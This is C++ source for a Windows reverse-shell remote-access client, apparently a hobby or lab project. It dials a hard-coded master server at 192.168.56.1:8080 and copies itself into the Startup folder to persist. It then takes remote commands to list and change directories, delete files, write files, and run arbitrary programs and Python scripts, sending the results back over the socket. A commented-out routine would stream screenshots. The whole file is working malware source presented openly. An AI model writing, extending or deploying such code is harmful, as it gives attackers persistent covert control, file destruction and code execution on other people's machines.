#include <WinSock2.h>
#include <Windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <iostream>    
#include <fstream>
#include <windows.h>
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024

using namespace std; // not sexually transmitted disease

void copy_to_startup_folder()
{
    char current_dir[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, current_dir);

    std::string source_path = std::string(current_dir) + "\\client.exe";
    string dest_path = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\";

    // Get the filename from the source path and concatenate it to the destination path
    string filename = source_path.substr(source_path.find_last_of("\\") + 1);
    dest_path += filename;

    if (CopyFileA(source_path.c_str(), dest_path.c_str(), FALSE))
    {
        std::cout << "[+] File copied to startup folder" << std::endl;
    }
    else
    {
        LPVOID lpMsgBuf;
        DWORD error_code = GetLastError();

        FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                       NULL, error_code, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&lpMsgBuf, 0, NULL);

        std::cout << "[x] Failed to copy file to startup folder: " << (LPSTR)lpMsgBuf << std::endl;

        LocalFree(lpMsgBuf);
    }
}

void whoami(char* ret) // If bot wants to execute whoami
{
    DWORD bufflen = 257;
    GetUserNameA(ret,&bufflen);
}

void hostname(char* ret)
{
    DWORD bufflen = 257;
    GetComputerNameA(ret, &bufflen);
}

void pwd(char* ret)
{
    GetCurrentDirectoryA(MAX_PATH, ret);
}

void ls(char* buffer)
{
    WIN32_FIND_DATAA findData;
    HANDLE hFind;

    hFind = FindFirstFileA("*", &findData);
    if (hFind != INVALID_HANDLE_VALUE)
    {
        do {
            strcat(buffer, findData.cFileName);
            strcat(buffer, "\n");
        } while (FindNextFileA(hFind, &findData));
            FindClose(hFind);
    }
    else
        {
            strcat(buffer, "[x] Failed to list files in directory.");
    }
}

void exec(char* buffer, char* command)
{
    if (32 >= (int)(ShellExecuteA(NULL,"open", command, NULL, NULL, SW_SHOW)) && strstr(command, ".py")) //Get return value in int
    {
        strcat(buffer, "[x] Command Execution failed.. Could not execute:\n");
        strcat(buffer, command);
    }
    else if (strstr(command, ".py")) // If the command is a Python script
    {
        // Execute the Python script using system function
        std::string python = "python ";
        std::string full_command = python + command + " > output.txt"; // Redirect output to file
        int result = system(full_command.c_str());

        // Check if the execution was successful
        if (result == 0)
        {
            // Read contents of output file
            std::ifstream output_file("output.txt");
            std::string output((std::istreambuf_iterator<char>(output_file)), std::istreambuf_iterator<char>());
            output_file.close();

            // Send output back to master
            strcat(buffer, "Executed Python script: ");
            strcat(buffer, command);
            strcat(buffer, "\n");
            strcat(buffer, output.c_str());
        }
        else
        {
            strcat(buffer, "[x] Command Execution failed.. Could not execute:\n");
            strcat(buffer, command);
        }
    }
    else
    {
        // Execute the command using ShellExecuteA function
        if (32 >= (int)(ShellExecuteA(NULL,"open", command, NULL, NULL, SW_SHOW))) //Get return value in int
        {
            strcat(buffer, "[x] Command Execution failed.. Could not execute:\n");
            strcat(buffer, command);
        }
        else
        {
            strcat(buffer, "Executed ");
            strcat(buffer, command);
            strcat(buffer, "\n");
        }
    }
}

// void screenshot(SOCKET tcpsocket)
// {
//     // Get the desktop window
//     HWND desktopWindow = GetDesktopWindow();

//     // Get the size of the desktop window
//     RECT desktopRect;
//     GetWindowRect(desktopWindow, &desktopRect);

//     // Create a compatible device context and bitmap
//     HDC desktopDC = GetDC(desktopWindow);
//     HDC captureDC = CreateCompatibleDC(desktopDC);
//     HBITMAP captureBitmap = CreateCompatibleBitmap(desktopDC, desktopRect.right - desktopRect.left, desktopRect.bottom - desktopRect.top);

//     // Select the bitmap into the device context
//     SelectObject(captureDC, captureBitmap);

//     // Use BitBlt to copy the screen into the bitmap
//     BitBlt(captureDC, 0, 0, desktopRect.right - desktopRect.left, desktopRect.bottom - desktopRect.top, desktopDC, 0, 0, SRCCOPY);

//     // Get the size of the bitmap
//     BITMAP bitmap;
//     GetObject(captureBitmap, sizeof(BITMAP), &bitmap);

//     // Send the bitmap data back to the client
//     int dataSize = bitmap.bmWidth * bitmap.bmHeight * (bitmap.bmBitsPixel / 8);
//     char* data = new char[dataSize];
//     GetBitmapBits(captureBitmap, dataSize, data);
//     send(tcpsocket, data, dataSize, 0);

//     // Clean up
//     delete[] data;
//     DeleteObject(captureBitmap);
//     DeleteDC(captureDC);
//     ReleaseDC(desktopWindow, desktopDC);
// }


// char* substring(char* s, int a, int b)
// {
//     char res[DEFAULT_BUFLEN]  = "";
//     for(int i=a;i<b;i++) res[i] = s[i];
// }

void reverse_shell()
{
    WSADATA wsaver; //The WSADATA structure contains information about the Windows Sockets implementation. 
    WSAStartup(MAKEWORD(2,2), &wsaver); //allows an application or DLL to specify the version of Windows Sockets required and retrieve details of the specific Windows Sockets implementation. The application or DLL can only issue further Windows Sockets functions after successfully calling WSAStartup.
    SOCKET tcpsocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    sockaddr_in address;
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr("192.168.56.1");
    address.sin_port = htons(8080);
    bool connected = false;
    cout << "Attempting to connect to master server..." << endl;
    
    if(connected==false)
    {
        while(true)
        {
            if(connect(tcpsocket, (SOCKADDR*)&address, sizeof(address))==SOCKET_ERROR) 
            {
                cout << "[!] Failed to connect to master server. Reconnecting..." << endl;
                continue;
            }
            else
            {
                cout << "[+] Connected to client. Hit <Enter> to disconnect..." << endl;
                cout << "[+] Waiting for incoming command" << endl;
                copy_to_startup_folder();
                char incoming_command[DEFAULT_BUFLEN] = "";
        while (true)
        {
            int Result = recv(tcpsocket, incoming_command, DEFAULT_BUFLEN, 0);
            cout << "Command received:" << incoming_command;
            cout << "Length of Command received: " << Result << endl;
            char command[DEFAULT_BUFLEN] = "";
                for(int i =0;i<Result-1;i++)
                {
                    command[i] = incoming_command[i]; //I was getting an error with trailing spaces so wrote this to fix
                }
            if ((strcmp(command, "whoami") == 0)) {
                char buffer[257] = "";
                whoami(buffer);
                strcat(buffer, "\n");
                // send(tcpsocket, buffer, strlen(buffer)+1, 0);
                send(tcpsocket, buffer , strlen(buffer)+1, 0);
                memset(buffer, 0, sizeof(buffer));
                memset(command, 0, sizeof(command));
            }
            else if ((strcmp(command, "hostname") == 0)) {
                char buffer[257] = "";
                hostname(buffer);
                strcat(buffer, "\n");
                send(tcpsocket, buffer, strlen(buffer)+1, 0);
                memset(buffer, 0, sizeof(buffer));
                memset(command, 0, sizeof(command));
            }
            else if ((strcmp(command, "ls") == 0)) {
                char buffer[257] = "";
                ls(buffer);
                send(tcpsocket, buffer, strlen(buffer)+1, 0);
                memset(buffer, 0, sizeof(buffer));
                memset(command, 0, sizeof(command));
            }
            else if ((strcmp(command, "pwd") == 0)) {
                char buffer[257] = "";
                pwd(buffer);
                strcat(buffer, "\n");
                send(tcpsocket, buffer, strlen(buffer)+1, 0);
                memset(buffer, 0, sizeof(buffer));
                memset(command, 0, sizeof(command));
            }
            else if ((strcmp(command, "exit") == 0)) {
                closesocket(tcpsocket);
                WSACleanup();
                exit(0);
            }
            else if((strstr(command, "rm ")))
            {
                char buffer[257] = "";
                char* filename = command + 3; // get filename from command (excluding "rm " prefix)
                if (DeleteFileA(filename))
                {
                    strcat(buffer, "Deleted file: ");
                    strcat(buffer, filename);
                    strcat(buffer, "\n");
                    send(tcpsocket, buffer, strlen(buffer)+1, 0);
                    memset(buffer, 0, sizeof(buffer));
                    memset(command, 0, sizeof(command));
                    memset(filename, 0, sizeof(filename));
                }
                else
                {
                    strcat(buffer, "[x] Failed to delete file: ");
                    strcat(buffer, filename);
                    strcat(buffer, "\n");
                    send(tcpsocket, buffer, strlen(buffer)+1, 0);
                    memset(buffer, 0, sizeof(buffer));
                    memset(command, 0, sizeof(command));
                    memset(filename, 0, sizeof(filename));
                }
            }
            else if (command[0] == 'c' & command[1] == 'd' & command[2]==' ') {
            char buffer[257] = "";
            char dir[MAX_PATH] = "";
            int j=0;
            for(int i = 3;i<Result-1;i++) 
            {
                dir[j] = command[i];
                j++;
            }
            if (SetCurrentDirectoryA(dir) != 0) {
                strcat(buffer, "Directory changed\n");
            } else {
                strcat(buffer, "Failed to change directory\n");
            }
            send(tcpsocket, buffer, strlen(buffer)+1, 0);
            memset(buffer, 0, sizeof(buffer));
            memset(command, 0, sizeof(command));
            }
            else if(command[0]=='e' & command[1]=='x' & command[2]=='e' & command[3]=='c' & command[4]==' ')
            {
            char buffer[257] = "";
            char ex[MAX_PATH] = "";
            int j=0;
            for(int i = 5;i<Result-1;i++) 
            {
                ex[j] = command[i];
                j++;
            }
            exec(buffer, ex);
            send(tcpsocket, buffer, strlen(buffer)+1,0);
            memset(buffer, 0, sizeof(buffer));
            }
            // else if ((strcmp(command, "screenshot") == 0)) {
            //     screenshot(tcpsocket);
            // }
            else if (command[0]=='n' & command[1]=='a' & command[2]=='n' & command[3]=='o' & command[4]==' ') {
            char filename[MAX_PATH] = "";
            char content[257] = "";
            int j = 0, k = 0;
            int filenameindex;
            for (int i = 5; i < Result - 1; i++) {
                if (command[i] != ' ') {
                    filename[j++] = command[i];
                } else {
                    filenameindex = i;
                    break;
                }
            }
            for (int i = filenameindex + 1; i < Result-1; i++) {
                if (command[i] == '\\' && command[i+1] == 'n') { // check for newline escape sequence
                    content[k++] = '\n';
                    i++; // skip the escape sequence
                } else {
            content[k++] = command[i];
        }
            }
            FILE* fp = fopen(filename, "w");
            if (fp == NULL) {
                printf("Failed to open file: %s\n", filename);
                return;
            }
            fprintf(fp, "%s", content); // write content to file using fprintf()
            fclose(fp); // close file
            printf("File written successfully: %s\n", filename);

            char buffer[257] = "File written successfully.";
            send(tcpsocket, buffer, strlen(buffer)+1, 0);
            memset(buffer, 0, sizeof(buffer));
            memset(command, 0, sizeof(command));
            memset(filename, 0, sizeof(filename));
        }
            else {
                char buffer[20] = "Invalid Command\n";
                send(tcpsocket, buffer, strlen(buffer)+1, 0);
                memset(buffer, 0, sizeof(buffer));  
                memset(incoming_command, 0, sizeof(command));
            }
        }
            
            }
    }
    closesocket(tcpsocket);
    WSACleanup();
}
}

//Main Function

int main()
{
    // Allocate a console for debugging
    AllocConsole();

    // Hide the console window
    HWND stealthWindow = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealthWindow, SW_SHOW);

    HWND console = GetConsoleWindow();
    ShowWindow(console,SW_SHOW);
    // Find the PowerShell window and hide it
    HWND powershellWindow = FindWindowA("Windows PowerShell", NULL);
    ShowWindow(powershellWindow, SW_SHOW);

    // Call the reverse_shell function
    reverse_shell();

    return 0;
}



